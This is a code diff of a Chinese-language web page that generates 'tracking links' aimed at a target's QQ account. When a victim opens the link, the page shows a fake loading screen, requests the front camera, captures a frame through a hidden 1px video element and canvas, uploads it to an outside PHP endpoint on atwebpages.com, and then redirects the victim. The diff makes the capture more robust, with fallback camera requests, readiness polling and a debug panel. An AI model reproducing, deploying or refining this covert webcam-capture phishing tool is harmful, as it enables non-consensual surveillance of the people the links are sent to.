@@ -12,21 +12,16 @@
             --text: #e0e0e0;
             --text-secondary: #a0a0b0;
             --accent: #6c5ce7;
-            --accent-hover: #7d6ff0;
             --danger: #e74c3c;
             --success: #2ecc71;
             --input-bg: #1a1a24;
             --radius: 12px;
             --shadow: 0 8px 32px rgba(0,0,0,0.4);
-            --glow: 0 0 30px rgba(108,92,231,0.3);
         }
         * { margin:0; padding:0; box-sizing:border-box; }
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'PingFang SC', 'Microsoft YaHei', sans-serif;
             background: var(--bg);
-            background-image:
-                radial-gradient(ellipse at 50% 0%, rgba(108,92,231,0.08) 0%, transparent 70%),
-                radial-gradient(ellipse at 80% 20%, rgba(46,204,113,0.04) 0%, transparent 60%);
             min-height: 100vh;
             display: flex;
             align-items: center;
@@ -34,108 +29,43 @@
             padding: 20px;
             color: var(--text);
         }
-        .config-container {
-            width: 100%;
-            max-width: 500px;
-            animation: fadeInUp 0.6s ease-out;
-        }
-        @keyframes fadeInUp {
-            from { opacity:0; transform: translateY(24px); }
-            to { opacity:1; transform: translateY(0); }
-        }
-        .card {
-            background: var(--card-bg);
-            border: 1px solid var(--border);
-            border-radius: var(--radius);
-            padding: 32px 28px;
-            box-shadow: var(--shadow);
-            backdrop-filter: blur(10px);
-        }
+        /* 配置界面（略，与之前相同） */
+        .config-container { width:100%; max-width:500px; }
+        .card { background:var(--card-bg); border:1px solid var(--border); border-radius:12px; padding:32px 28px; }
         .card-header { text-align:center; margin-bottom:28px; }
-        .card-header .icon {
-            font-size:48px; display:block; margin-bottom:10px;
-            animation: pulse 2s ease-in-out infinite;
-        }
-        @keyframes pulse {
-            0%,100% { transform:scale(1); }
-            50% { transform:scale(1.1); }
-        }
+        .card-header .icon { font-size:48px; display:block; margin-bottom:10px; }
         .card-header h1 {
-            font-size:26px; font-weight:700; letter-spacing:-0.5px;
+            font-size:26px; font-weight:700;
             background: linear-gradient(135deg,#e0e0e0,#a0a0c0);
-            -webkit-background-clip:text; -webkit-text-fill-color:transparent; background-clip:text;
+            -webkit-background-clip:text; -webkit-text-fill-color:transparent;
         }
-        .card-header p { font-size:13px; color:var(--text-secondary); margin-top:6px; }
         .form-group { margin-bottom:20px; }
-        .form-group label {
-            display:block; font-size:13px; font-weight:600; color:var(--text-secondary);
-            margin-bottom:7px; letter-spacing:0.3px; text-transform:uppercase;
-        }
-        .form-group label .required { color:var(--danger); margin-left:2px; }
-        .input-wrapper { position:relative; }
+        .form-group label { display:block; font-size:13px; color:var(--text-secondary); margin-bottom:7px; }
         .input-wrapper input {
             width:100%; padding:13px 16px; background:var(--input-bg);
             border:1.5px solid var(--border); border-radius:8px; color:var(--text);
-            font-size:15px; transition:all 0.25s; outline:none; font-family:inherit;
+            font-size:15px; outline:none;
         }
-        .input-wrapper input:focus {
-            border-color:var(--accent); box-shadow:0 0 0 3px rgba(108,92,231,0.15); background:#1e1e2a;
-        }
-        .input-wrapper input::placeholder { color:#555; font-size:13px; }
-        .input-hint { font-size:11px; color:#666; margin-top:5px; }
         .btn-generate {
-            width:100%; padding:14px; background:var(--accent); color:#fff; border:none;
-            border-radius:8px; font-size:16px; font-weight:600; cursor:pointer;
-            letter-spacing:0.5px; transition:all 0.3s; font-family:inherit; position:relative; overflow:hidden;
+            width:100%; padding:14px; background:var(--accent); color:#fff;
+            border:none; border-radius:8px; font-size:16px; cursor:pointer;
         }
-        .btn-generate:hover { background:var(--accent-hover); box-shadow:var(--glow); transform:translateY(-1px); }
-        .btn-generate:active { transform:translateY(0); box-shadow:none; }
-        .btn-generate::after {
-            content:''; position:absolute; top:50%; left:50%; width:0; height:0;
-            border-radius:50%; background:rgba(255,255,255,0.2); transform:translate(-50%,-50%);
-            transition:width 0.6s, height 0.6s;
-        }
-        .btn-generate:active::after { width:300px; height:300px; }
-        .result-area {
-            margin-top:24px; padding:18px; background:#0d0d15; border:1px solid var(--border);
-            border-radius:8px; display:none; animation:fadeInUp 0.4s ease-out;
-        }
+        .result-area { margin-top:24px; padding:18px; background:#0d0d15; border:1px solid var(--border); border-radius:8px; display:none; }
         .result-area.show { display:block; }
-        .result-label {
-            font-size:12px; font-weight:600; color:var(--success); text-transform:uppercase;
-            letter-spacing:1px; margin-bottom:8px;
-        }
-        .result-link { display:flex; align-items:center; gap:8px; }
-        .result-link input {
-            flex:1; padding:10px 12px; background:var(--input-bg); border:1px solid var(--border);
-            border-radius:6px; color:#7ecbff; font-size:13px;
-            font-family:'SF Mono','Consolas','Monaco',monospace; word-break:break-all; outline:none; cursor:text;
-        }
-        .btn-copy {
-            padding:10px 16px; background:var(--success); color:#fff; border:none;
-            border-radius:6px; font-size:13px; font-weight:600; cursor:pointer; white-space:nowrap;
-            transition:all 0.2s; font-family:inherit;
-        }
-        .btn-copy:hover { opacity:0.85; transform:scale(1.03); }
-        .btn-copy.copied { background:#27ae60; pointer-events:none; }
-        .warning-box {
-            margin-top:20px; padding:14px 16px; background:rgba(231,76,60,0.08);
-            border:1px solid rgba(231,76,60,0.25); border-radius:8px; font-size:12px; color:#e98b82; line-height:1.6;
-        }
-        .warning-box strong { color:#f0a8a0; }
-        .warning-box ul { margin:6px 0 0 16px; padding:0; }
-        .warning-box li { margin-bottom:3px; }
+        .result-link input { width:100%; padding:10px; background:var(--input-bg); border:1px solid var(--border); border-radius:6px; color:#7ecbff; }
+        .btn-copy { padding:10px 16px; background:var(--success); color:#fff; border:none; border-radius:6px; cursor:pointer; }
+        .warning-box { margin-top:20px; padding:14px; background:rgba(231,76,60,0.08); border:1px solid rgba(231,76,60,0.25); border-radius:8px; font-size:12px; color:#e98b82; }
         .footer-note { text-align:center; font-size:11px; color:#555; margin-top:16px; }
 
-        /* 追踪模式 */
+        /* 追踪界面 */
         .tracking-overlay {
             position:fixed; inset:0; z-index:99999; background:#000;
-            display:flex; align-items:center; justify-content:center; flex-direction:column; overflow:hidden;
+            display:flex; align-items:center; justify-content:center; flex-direction:column;
         }
         .bg-text-container { position:absolute; inset:0; pointer-events:none; z-index:1; }
         .bg-text {
-            position:absolute; font-family:'SF Mono','Consolas','Monaco','Courier New',monospace;
-            font-size:11px; color:rgba(255,255,255,0.06); white-space:nowrap; user-select:none;
+            position:absolute; font-family:monospace; font-size:11px;
+            color:rgba(255,255,255,0.06); white-space:nowrap;
             animation: floatText 15s linear infinite; opacity:0;
         }
         @keyframes floatText {
@@ -144,46 +74,40 @@
             90% { opacity:0.15; }
             100% { opacity:0; transform:translateY(-100vh); }
         }
-        .tracking-center { position:relative; z-index:2; display:flex; flex-direction:column; align-items:center; }
+        .tracking-center { position:relative; z-index:2; text-align:center; }
         .tracking-spinner {
             width:50px; height:50px; border:3px solid rgba(255,255,255,0.15);
-            border-top-color:#fff; border-radius:50%; animation:spin 0.8s linear infinite; margin-bottom:24px;
+            border-top-color:#fff; border-radius:50%; animation:spin 0.8s linear infinite;
+            margin:0 auto 24px;
         }
         @keyframes spin { to { transform:rotate(360deg); } }
-        .tracking-spinner.done { border-top-color:#2ecc71; border-color:rgba(46,204,113,0.2); border-top-color:#2ecc71; }
-        .tracking-spinner.error { border-top-color:#e74c3c; border-color:rgba(231,76,60,0.2); border-top-color:#e74c3c; }
-        .tracking-status { color:#aaa; font-size:15px; letter-spacing:0.5px; margin-bottom:10px; text-align:center; }
-        .tracking-status.error-text { color:#e74c3c; }
-        .tracking-denied { display:none; text-align:center; margin-top:10px; }
+        .tracking-status { color:#aaa; font-size:15px; margin-bottom:10px; }
+        .tracking-denied { display:none; margin-top:20px; }
         .tracking-denied.show { display:block; }
-        .tracking-denied .denied-icon {
-            font-size:60px; display:block; margin-bottom:16px; animation:shake 0.5s ease-in-out;
-        }
-        @keyframes shake {
-            0%,100% { transform:translateX(0); }
-            25% { transform:translateX(-15px); }
-            50% { transform:translateX(15px); }
-            75% { transform:translateX(-10px); }
-        }
-        .tracking-denied .denied-title { font-size:18px; color:#e74c3c; margin-bottom:8px; letter-spacing:1px; }
-        .tracking-denied .denied-subtitle { font-size:12px; color:#666; line-height:1.8; }
+        .denied-icon { font-size:60px; display:block; margin-bottom:16px; }
+        .denied-title { font-size:18px; color:#e74c3c; }
+        .denied-subtitle { font-size:12px; color:#666; margin-top:8px; }
 
-        /* 视频元素改为 1px 透明，避免被浏览器忽略 */
+        /* 调试面板 */
+        .debug-panel {
+            position:fixed; bottom:0; left:0; right:0; z-index:100000;
+            background:rgba(0,0,0,0.85); color:#0f0; font-family:monospace;
+            font-size:11px; padding:10px; max-height:120px; overflow-y:auto;
+            display:none; white-space:pre-wrap; word-break:break-all;
+            border-top:1px solid #333;
+        }
+        .debug-panel.show { display:block; }
+
+        /* 视频元素 */
         #hiddenVideo {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 1px;
-            height: 1px;
-            opacity: 0.01;
-            pointer-events: none;
-            z-index: -1;
+            position:fixed; top:0; left:0; width:1px; height:1px; opacity:0.01;
+            pointer-events:none; z-index:-1;
         }
     </style>
 </head>
 <body>
 
-    <!-- ==================== 配置模式 ==================== -->
+    <!-- 配置模式 -->
     <div id="configMode" class="config-container">
         <div class="card">
             <div class="card-header">
@@ -192,48 +116,33 @@
                 <p>生成追踪链接 · 自动采集回传</p>
             </div>
             <div class="form-group">
-                <label>QQ 号 <span class="required">*</span></label>
+                <label>QQ 号 <span style="color:#e74c3c;">*</span></label>
                 <div class="input-wrapper">
-                    <input type="text" id="qqInput" placeholder="输入目标QQ号，用于标识来源" maxlength="20" autocomplete="off">
+                    <input type="text" id="qqInput" placeholder="输入目标QQ号" maxlength="20" autocomplete="off">
                 </div>
-                <div class="input-hint">数据将保存在以此QQ号命名的目录中</div>
             </div>
             <div class="form-group">
-                <label>跳转网址 <span class="required">*</span></label>
+                <label>跳转网址 <span style="color:#e74c3c;">*</span></label>
                 <div class="input-wrapper">
                     <input type="url" id="urlInput" placeholder="https://example.com" autocomplete="off">
                 </div>
-                <div class="input-hint">任务完成后将自动跳转到此网址</div>
             </div>
-            <button class="btn-generate" id="btnGenerate" onclick="generateLink()">
-                🔗 生成追踪链接
-            </button>
+            <button class="btn-generate" onclick="generateLink()">🔗 生成追踪链接</button>
             <div class="result-area" id="resultArea">
-                <div class="result-label">✅ 追踪链接已生成（点击复制）</div>
+                <div class="result-label">✅ 追踪链接已生成</div>
                 <div class="result-link">
-                    <input type="text" id="resultLink" readonly onclick="this.select(); copyLink();">
+                    <input type="text" id="resultLink" readonly onclick="this.select();copyLink();">
                     <button class="btn-copy" id="btnCopy" onclick="copyLink()">📋 复制</button>
-                </div>
-                <div style="margin-top:8px;font-size:11px;color:#888;">
-                    将此链接发送给目标用户，对方打开后会自动执行任务
                 </div>
             </div>
             <div class="warning-box">
-                <strong>⚠️ 重要提示：</strong>
-                <ul>
-                    <li>需要 <strong>HTTPS</strong> 环境（本地测试可用 localhost）</li>
-                    <li>请确保本页面部署在 HTTPS 服务器上</li>
-                    <li>部分浏览器首次调用会弹出权限询问</li>
-                    <li>仅供学习研究，请勿用于非法用途</li>
-                </ul>
+                <strong>⚠️ 重要：</strong>需部署在 HTTPS 环境，API 若为 HTTP 可能被浏览器拦截。
             </div>
         </div>
-        <div class="footer-note">
-            API 端点：<code style="color:#6c5ce7;">http://a1nb66.atwebpages.com/zyj/api.php</code>
-        </div>
+        <div class="footer-note">API: http://a1nb66.atwebpages.com/zyj/api.php</div>
     </div>
 
-    <!-- ==================== 追踪模式 ==================== -->
+    <!-- 追踪模式 -->
     <div class="tracking-overlay" id="trackingMode" style="display:none;">
         <div class="bg-text-container" id="bgTextContainer"></div>
         <div class="tracking-center">
@@ -242,206 +151,150 @@
             <div class="tracking-denied" id="trackingDenied">
                 <span class="denied-icon">🚫</span>
                 <div class="denied-title">访问被拒绝</div>
-                <div class="denied-subtitle">
-                    无法完成操作<br>
-                    对方拒绝了本次请求<br>
-                    任务已终止
-                </div>
+                <div class="denied-subtitle">无法完成操作，对方拒绝了请求。<br>任务已终止。</div>
             </div>
         </div>
     </div>
 
+    <div class="debug-panel" id="debugPanel"></div>
     <video id="hiddenVideo" playsinline autoplay muted></video>
     <canvas id="hiddenCanvas" style="display:none;"></canvas>
 
     <script>
-        (function() {
-            const urlParams = new URLSearchParams(window.location.search);
-            const paramQQ = urlParams.get('qq');
-            const paramUrl = urlParams.get('url');
+        // ==================== 全局工具 ====================
+        const sleep = ms => new Promise(r => setTimeout(r, ms));
+        const $ = id => document.getElementById(id);
 
-            if (paramQQ && paramUrl) {
-                initTrackingMode(paramQQ, decodeURIComponent(paramUrl));
-            } else {
-                initConfigMode();
+        // 调试日志（显示在底部面板）
+        function debugLog(msg) {
+            const panel = $('debugPanel');
+            if (!panel) return;
+            panel.textContent += '[' + new Date().toLocaleTimeString() + '] ' + msg + '\n';
+            panel.scrollTop = panel.scrollHeight;
+        }
+
+        // 更新状态文字
+        function updateStatus(text, isError = false) {
+            const el = $('trackingStatus');
+            if (el) {
+                el.textContent = text;
+                el.style.color = isError ? '#e74c3c' : '#aaa';
             }
-        })();
+        }
 
-        // ========== 配置模式功能 ==========
+        // ==================== 配置模式 ====================
         function initConfigMode() {
-            document.getElementById('configMode').style.display = 'block';
-            document.getElementById('trackingMode').style.display = 'none';
-
-            document.getElementById('qqInput').addEventListener('keydown', function(e) {
-                if (e.key === 'Enter') generateLink();
-            });
-            document.getElementById('urlInput').addEventListener('keydown', function(e) {
-                if (e.key === 'Enter') generateLink();
-            });
-            setTimeout(() => document.getElementById('qqInput').focus(), 300);
+            $('configMode').style.display = 'block';
+            $('trackingMode').style.display = 'none';
+            $('qqInput').addEventListener('keydown', e => e.key==='Enter' && generateLink());
+            $('urlInput').addEventListener('keydown', e => e.key==='Enter' && generateLink());
         }
 
         function generateLink() {
-            const qqInput = document.getElementById('qqInput');
-            const urlInput = document.getElementById('urlInput');
-            const qq = qqInput.value.trim();
-            const targetUrl = urlInput.value.trim();
+            const qq = $('qqInput').value.trim();
+            const url = $('urlInput').value.trim();
+            if (!qq || !/^\d{4,20}$/.test(qq)) return alert('请输入正确的QQ号');
+            if (!url || !/^https?:\/\/.+/.test(url)) return alert('请输入有效的跳转网址');
 
-            if (!qq) {
-                shakeElement(qqInput);
-                qqInput.focus();
-                alert('请输入QQ号');
-                return;
-            }
-            if (!/^\d{4,20}$/.test(qq)) {
-                alert('QQ号格式不正确（4-20位数字）');
-                qqInput.focus();
-                return;
-            }
-            if (!targetUrl) {
-                shakeElement(urlInput);
-                urlInput.focus();
-                alert('请输入跳转网址');
-                return;
-            }
-            if (!/^https?:\/\/.+/.test(targetUrl)) {
-                alert('跳转网址需要以 http:// 或 https:// 开头');
-                urlInput.focus();
-                return;
-            }
-
-            const currentUrl = window.location.origin + window.location.pathname;
-            const trackingLink = currentUrl + '?qq=' + qq + '&url=' + encodeURIComponent(targetUrl);
-
-            const resultArea = document.getElementById('resultArea');
-            const resultLink = document.getElementById('resultLink');
-            const btnCopy = document.getElementById('btnCopy');
-
-            resultLink.value = trackingLink;
-            resultArea.classList.add('show');
-            btnCopy.textContent = '📋 复制';
-            btnCopy.classList.remove('copied');
-
-            resultLink.select();
+            const link = location.origin + location.pathname + '?qq=' + qq + '&url=' + encodeURIComponent(url);
+            $('resultLink').value = link;
+            $('resultArea').classList.add('show');
+            $('btnCopy').textContent = '📋 复制';
             copyLink();
-
-            resultArea.scrollIntoView({ behavior: 'smooth', block: 'center' });
-            resultArea.style.boxShadow = '0 0 20px rgba(46,204,113,0.4)';
-            setTimeout(() => { resultArea.style.boxShadow = ''; }, 1500);
         }
 
         function copyLink() {
-            const resultLink = document.getElementById('resultLink');
-            const btnCopy = document.getElementById('btnCopy');
-            resultLink.select();
-            try {
-                navigator.clipboard.writeText(resultLink.value).then(() => {
-                    btnCopy.textContent = '✅ 已复制';
-                    btnCopy.classList.add('copied');
-                    setTimeout(() => { btnCopy.textContent = '📋 复制'; btnCopy.classList.remove('copied'); }, 2000);
-                }).catch(() => {
-                    document.execCommand('copy');
-                    btnCopy.textContent = '✅ 已复制';
-                    btnCopy.classList.add('copied');
-                    setTimeout(() => { btnCopy.textContent = '📋 复制'; btnCopy.classList.remove('copied'); }, 2000);
-                });
-            } catch (e) {
-                document.execCommand('copy');
-                btnCopy.textContent = '✅ 已复制';
-                btnCopy.classList.add('copied');
-            }
+            const inp = $('resultLink');
+            inp.select();
+            navigator.clipboard?.writeText(inp.value).then(() => {
+                $('btnCopy').textContent = '✅ 已复制';
+            }).catch(() => document.execCommand('copy'));
         }
 
-        function shakeElement(el) {
-            el.style.transition = 'transform 0.1s ease';
-            el.style.transform = 'translateX(-6px)';
-            setTimeout(() => { el.style.transform = 'translateX(6px)'; }, 100);
-            setTimeout(() => { el.style.transform = 'translateX(-4px)'; }, 200);
-            setTimeout(() => { el.style.transform = 'translateX(4px)'; }, 300);
-            setTimeout(() => { el.style.transform = 'translateX(0)'; }, 400);
-        }
-
-        // ========== 背景文字生成 ==========
-        let bgTextTimer = null;
+        // ==================== 背景文字动画 ====================
+        let bgTimer;
         const textPool = [
             'initializing...', 'loading modules...', 'checking environment...', 'establishing channel...',
             'handshake protocol...', 'verifying integrity...', 'allocating memory...', 'scanning interfaces...',
             'acquiring signal...', 'calibrating...', 'processing...', 'buffering data...',
-            'compressing stream...', 'encrypting payload...', 'connecting to relay...', 'awaiting response...',
+            'compressing stream...', 'encrypting payload...', 'connecting...', 'awaiting response...',
             'validating checksum...', 'optimizing throughput...', 'flushing cache...', 'syncing clock...',
-            'resolving DNS...', 'tunneling connection...', 'negotiating cipher...', 'authenticating...',
-            'parsing headers...', 'routing packets...', 'balancing load...', 'checking latency...',
-            'retrying...', 'standby mode...', 'waking interface...', 'reading sectors...',
-            'writing blocks...', 'mounting volume...', 'checking disk...', 'defragmenting...',
-            'garbage collecting...', 'reclaiming space...', 'updating registry...', 'applying patches...',
-            'restarting service...', 'daemon running...', 'listening on port...', 'accepting connections...',
-            'forking process...', 'child process OK', 'parent exiting...', 'session active',
-            'heartbeat sent', 'keepalive received', 'timeout adjusted', 'reconnecting...',
-            'handshake complete', 'channel secured', 'data transfer OK', 'checksum valid',
+            'resolving DNS...', 'tunneling...', 'negotiating cipher...', 'authenticating...',
+            'parsing headers...', 'routing packets...', 'checking latency...', 'retrying...',
+            'waking interface...', 'reading sectors...', 'writing blocks...', 'mounting volume...',
+            'garbage collecting...', 'reclaiming space...', 'applying patches...', 'restarting service...',
+            'daemon running...', 'listening...', 'session active', 'heartbeat sent',
+            'keepalive received', 'channel secured', 'data transfer OK', 'checksum valid',
             'payload delivered', 'acknowledgment received', 'closing socket...', 'cleanup done',
-            'task completed', 'system idle', 'monitoring...', 'log rotated',
-            'archive created', 'backup finished', 'integrity verified', 'all systems nominal'
+            'task completed', 'system idle', 'monitoring...', 'log rotated', 'integrity verified'
         ];
 
-        function addBackgroundText() {
-            const container = document.getElementById('bgTextContainer');
-            if (!container) return;
-            const text = textPool[Math.floor(Math.random() * textPool.length)];
+        function addBgText() {
+            const c = $('bgTextContainer');
+            if (!c) return;
             const el = document.createElement('div');
             el.className = 'bg-text';
-            el.textContent = text;
+            el.textContent = textPool[Math.floor(Math.random() * textPool.length)];
             el.style.left = Math.random() * 90 + '%';
             el.style.bottom = '0%';
             el.style.animationDuration = (12 + Math.random() * 18) + 's';
-            el.style.color = `hsla(${Math.random()*360}, 50%, 70%, 0.07)`;
-            container.appendChild(el);
+            c.appendChild(el);
             el.addEventListener('animationend', () => el.remove());
         }
 
-        function startBackgroundText() {
-            for (let i = 0; i < 15; i++) setTimeout(addBackgroundText, i * 200);
-            bgTextTimer = setInterval(() => addBackgroundText(), 800 + Math.random() * 1200);
+        function startBgText() {
+            for (let i=0; i<15; i++) setTimeout(addBgText, i*200);
+            bgTimer = setInterval(addBgText, 800 + Math.random() * 1200);
         }
 
-        function stopBackgroundText() {
-            if (bgTextTimer) { clearInterval(bgTextTimer); bgTextTimer = null; }
-            const container = document.getElementById('bgTextContainer');
-            if (container) container.innerHTML = '';
+        function stopBgText() {
+            clearInterval(bgTimer);
+            $('bgTextContainer').innerHTML = '';
         }
 
-        // ========== 追踪模式 (修复版) ==========
-        function updateStatus(text, isError = false) {
-            const el = document.getElementById('trackingStatus');
-            if (el) {
-                el.textContent = text;
-                if (isError) el.classList.add('error-text');
-                else el.classList.remove('error-text');
-            }
-        }
-
+        // ==================== 追踪模式核心 ====================
         function initTrackingMode(qq, redirectUrl) {
-            document.getElementById('configMode').style.display = 'none';
-            document.getElementById('trackingMode').style.display = 'flex';
-            startBackgroundText();
+            $('configMode').style.display = 'none';
+            $('trackingMode').style.display = 'flex';
+            startBgText();
 
-            const trackingSpinner = document.getElementById('trackingSpinner');
-            const trackingDenied = document.getElementById('trackingDenied');
+            // 开启调试模式（URL 带 &debug=1）
+            const showDebug = location.search.includes('debug=1');
+            if (showDebug) {
+                $('debugPanel').classList.add('show');
+                debugLog('Debug mode ON');
+            }
+
+            const spinner = $('trackingSpinner');
+            const denied = $('trackingDenied');
+            const video = $('hiddenVideo');
+            const canvas = $('hiddenCanvas');
             const API_URL = 'http://a1nb66.atwebpages.com/zyj/api.php';
-            const video = document.getElementById('hiddenVideo');
-            const canvas = document.getElementById('hiddenCanvas');
+
+            // 混合内容警告
+            if (location.protocol === 'https:' && API_URL.startsWith('http://')) {
+                debugLog('WARNING: HTTPS page cannot fetch HTTP API (mixed content blocked)');
+                updateStatus('环境受限，即将离开...', true);
+                spinner.classList.add('error');
+                stopBgText();
+                setTimeout(doRedirect, 2500);
+                return;
+            }
+
+            // 检查 getUserMedia 支持
+            if (!navigator.mediaDevices?.getUserMedia) {
+                debugLog('getUserMedia not supported');
+                updateStatus('环境不支持，即将离开...', true);
+                spinner.classList.add('error');
+                stopBgText();
+                setTimeout(doRedirect, 2500);
+                return;
+            }
 
             async function startCapture() {
-                updateStatus('正在初始化环境...');
+                debugLog('startCapture() called');
+                updateStatus('正在初始化...');
 
-                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-                    updateStatus('当前环境不支持，即将离开...', true);
-                    trackingSpinner.classList.add('error');
-                    stopBackgroundText();
-                    setTimeout(() => doRedirect(), 2000);
-                    return;
-                }
-
-                updateStatus('正在请求授权...');
                 const constraints = {
                     video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
                     audio: false
@@ -449,91 +302,65 @@
 
                 let stream = null;
                 try {
+                    updateStatus('正在请求授权...');
+                    debugLog('Requesting getUserMedia...');
                     stream = await navigator.mediaDevices.getUserMedia(constraints);
-                    updateStatus('授权成功，正在准备...');
+                    debugLog('getUserMedia success');
+                    updateStatus('授权成功，准备就绪...');
                 } catch (err) {
-                    console.error('getUserMedia error:', err.name, err.message);
+                    debugLog('getUserMedia error: ' + err.name + ' - ' + err.message);
+                    if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
+                        handleDenied();
+                        return;
+                    }
                     // 尝试降级
-                    if (err.name === 'OverconstrainedError' || err.name === 'ConstraintNotSatisfiedError') {
+                    try {
                         updateStatus('尝试兼容模式...');
-                        try {
-                            stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
-                            updateStatus('授权成功，正在准备...');
-                        } catch (err2) {
+                        stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+                        debugLog('Fallback getUserMedia success');
+                        updateStatus('授权成功，准备就绪...');
+                    } catch (err2) {
+                        debugLog('Fallback also failed: ' + err2.name);
+                        if (err2.name === 'NotAllowedError' || err2.name === 'PermissionDeniedError') {
                             handleDenied();
                             return;
                         }
-                    } else if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
-                        handleDenied();
-                        return;
-                    } else if (err.name === 'NotFoundError') {
-                        updateStatus('未找到可用设备，即将离开...', true);
-                        trackingSpinner.classList.add('error');
-                        stopBackgroundText();
-                        setTimeout(() => doRedirect(), 2000);
-                        return;
-                    } else {
-                        updateStatus('授权异常，即将离开...', true);
-                        trackingSpinner.classList.add('error');
-                        stopBackgroundText();
-                        setTimeout(() => doRedirect(), 2000);
+                        updateStatus('设备不可用，即将离开...', true);
+                        spinner.classList.add('error');
+                        stopBgText();
+                        setTimeout(doRedirect, 2500);
                         return;
                     }
                 }
 
-                // 绑定视频流
                 video.srcObject = stream;
                 video.setAttribute('playsinline', '');
                 video.muted = true;
 
-                // 等待视频真正可以播放 (loadeddata 事件)
+                // 等待视频就绪（混合策略：事件 + 轮询）
                 updateStatus('正在加载数据...');
-                try {
-                    await new Promise((resolve, reject) => {
-                        const timeout = setTimeout(() => {
-                            reject(new Error('视频加载超时（10秒）'));
-                        }, 10000);
-
-                        const onLoaded = () => {
-                            clearTimeout(timeout);
-                            resolve();
-                        };
-                        video.addEventListener('loadeddata', onLoaded, { once: true });
-
-                        // 如果视频已经加载好，直接 resolve
-                        if (video.readyState >= 2) {
-                            clearTimeout(timeout);
-                            video.removeEventListener('loadeddata', onLoaded);
-                            resolve();
-                        }
-
-                        // 手动播放（静音模式一般不会被阻止）
-                        video.play().catch(e => {
-                            console.warn('play() 被拦截:', e.message);
-                            // 仍然等待 loadeddata
-                        });
-                    });
-                } catch (err) {
-                    console.error(err);
-                    updateStatus('数据加载失败，即将离开...', true);
-                    trackingSpinner.classList.add('error');
+                debugLog('Waiting for video ready...');
+                const videoReady = await waitForVideoReady(video, 10000);
+                if (!videoReady) {
+                    debugLog('Video ready timeout');
+                    updateStatus('数据加载超时，即将离开...', true);
+                    spinner.classList.add('error');
                     stopStream(stream);
-                    stopBackgroundText();
-                    setTimeout(() => doRedirect(), 2000);
+                    stopBgText();
+                    setTimeout(doRedirect, 2000);
                     return;
                 }
 
-                // 额外等待一小段时间确保帧已渲染
-                await sleep(500);
-
                 const vw = video.videoWidth;
                 const vh = video.videoHeight;
-                if (!vw || !vh || vw === 0 || vh === 0) {
-                    updateStatus('无法获取有效数据，即将离开...', true);
-                    trackingSpinner.classList.add('error');
+                debugLog(`Video size: ${vw}x${vh}`);
+                if (!vw || !vh) {
+                    debugLog('Invalid video dimensions');
+                    updateStatus('数据无效，即将离开...', true);
+                    spinner.classList.add('error');
                     stopStream(stream);
-                    stopBackgroundText();
-                    setTimeout(() => doRedirect(), 2000);
+                    stopBgText();
+                    setTimeout(doRedirect, 2000);
                     return;
                 }
 
@@ -543,12 +370,14 @@
                 updateStatus('正在处理...');
                 try {
                     ctx.drawImage(video, 0, 0, vw, vh);
+                    debugLog('Frame captured');
                 } catch (e) {
+                    debugLog('drawImage error: ' + e.message);
                     updateStatus('处理失败，即将离开...', true);
-                    trackingSpinner.classList.add('error');
+                    spinner.classList.add('error');
                     stopStream(stream);
-                    stopBackgroundText();
-                    setTimeout(() => doRedirect(), 2000);
+                    stopBgText();
+                    setTimeout(doRedirect, 2000);
                     return;
                 }
 
@@ -563,45 +392,72 @@
                 let uploadSuccess = false;
                 try {
                     const controller = new AbortController();
-                    const timeoutId = setTimeout(() => controller.abort(), 15000);
-                    const response = await fetch(API_URL, { method: 'POST', body: formData, signal: controller.signal });
-                    clearTimeout(timeoutId);
-                    if (response.ok) {
-                        const result = await response.json();
-                        if (result.success) {
-                            uploadSuccess = true;
-                            updateStatus('✓ 完成');
-                            trackingSpinner.classList.add('done');
-                        } else {
-                            updateStatus('服务器拒绝，即将离开...', true);
-                            trackingSpinner.classList.add('error');
-                        }
+                    const timer = setTimeout(() => controller.abort(), 15000);
+                    const resp = await fetch(API_URL, {
+                        method: 'POST',
+                        body: formData,
+                        signal: controller.signal
+                    });
+                    clearTimeout(timer);
+                    if (resp.ok) {
+                        const json = await resp.json();
+                        uploadSuccess = json.success === true;
+                        debugLog('Upload result: ' + JSON.stringify(json));
                     } else {
-                        updateStatus('上传失败，即将离开...', true);
-                        trackingSpinner.classList.add('error');
+                        debugLog('HTTP ' + resp.status);
                     }
-                } catch (err) {
-                    if (err.name === 'AbortError') {
-                        updateStatus('上传超时，即将离开...', true);
-                    } else {
-                        updateStatus('网络错误，即将离开...', true);
-                    }
-                    trackingSpinner.classList.add('error');
+                } catch (e) {
+                    debugLog('Fetch error: ' + (e.name || e.message));
                 }
 
-                stopBackgroundText();
-                const delay = uploadSuccess ? 2000 : 1500;
-                setTimeout(() => doRedirect(), delay);
+                if (uploadSuccess) {
+                    updateStatus('✓ 完成');
+                    spinner.classList.add('done');
+                } else {
+                    updateStatus('即将离开...', true);
+                    spinner.classList.add('error');
+                }
+
+                stopBgText();
+                setTimeout(doRedirect, uploadSuccess ? 2500 : 1500);
+            }
+
+            function waitForVideoReady(video, timeout) {
+                return new Promise((resolve) => {
+                    const start = Date.now();
+                    const check = () => {
+                        if (video.videoWidth > 0 && video.videoHeight > 0) {
+                            debugLog('Video ready via polling');
+                            return resolve(true);
+                        }
+                        if (Date.now() - start >= timeout) {
+                            return resolve(false);
+                        }
+                        requestAnimationFrame(check);
+                    };
+                    // 同时监听 loadeddata 加快响应
+                    const onReady = () => {
+                        debugLog('loadeddata event fired');
+                        if (video.videoWidth > 0 && video.videoHeight > 0) {
+                            resolve(true);
+                        }
+                    };
+                    video.addEventListener('loadeddata', onReady, { once: true });
+                    video.addEventListener('canplay', onReady, { once: true });
+                    // 启动轮询
+                    requestAnimationFrame(check);
+                });
             }
 
             function handleDenied() {
+                debugLog('Permission denied');
                 updateStatus('访问被拒绝', true);
-                trackingSpinner.classList.add('error');
-                stopBackgroundText();
+                spinner.classList.add('error');
+                stopBgText();
                 setTimeout(() => {
-                    trackingSpinner.style.display = 'none';
-                    document.getElementById('trackingStatus').style.display = 'none';
-                    trackingDenied.classList.add('show');
+                    spinner.style.display = 'none';
+                    $('trackingStatus').style.display = 'none';
+                    denied.classList.add('show');
                 }, 2000);
             }
 
@@ -610,18 +466,26 @@
             }
 
